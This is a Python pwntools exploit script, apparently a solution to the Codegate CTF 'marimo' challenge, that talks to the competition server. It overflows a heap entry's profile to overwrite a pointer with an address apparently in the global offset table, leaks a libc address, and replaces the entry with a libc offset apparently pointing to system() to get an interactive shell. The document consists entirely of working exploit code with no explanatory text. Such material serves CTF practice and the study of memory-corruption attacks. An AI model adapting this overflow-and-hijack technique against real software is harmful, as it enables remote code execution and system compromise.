from pwn import *

#s = remote('192.168.33.10',1234)
s = remote('ch41l3ng3s.codegate.kr', 3333)
def show_marimo(name, profile):
  s.recvuntil('>>')
  s.sendline('show me the marimo')
  s.recvuntil('(0x10)')
  s.sendline(name)
  s.recvuntil('>>')
  s.sendline(profile)

def modify(index, profile):
  s.recvuntil('>>')
  s.sendline('V')
  s.recvuntil('>>')
  s.sendline(str(index))
  s.recvuntil('>>')
  s.sendline('M')
  s.recvuntil('>>')
  s.sendline(profile)

def view(index):
  s.recvuntil('>>')
  s.sendline('V')
  s.recvuntil('>>')
  s.sendline(str(index))
  s.recvuntil('>>')

show_marimo("AAAA","BBBB")
show_marimo("AAAA","BBBB")
sleep(3)
raw_input()
modify(0,"A"*0x38 + p64(0x603040) + p64(0x603040))
s.recvuntil('>>')
s.sendline('B')
view(1)
libc = u64(s.recvuntil('\x7f')[-6:]+"\x00\x00") - 0x9f570
log.info("LIBC : 0x%x"%libc)
s.sendline('M')
s.recvuntil('>>')
s.sendline(p64(libc+0x45390)[:-1])

s.interactive()
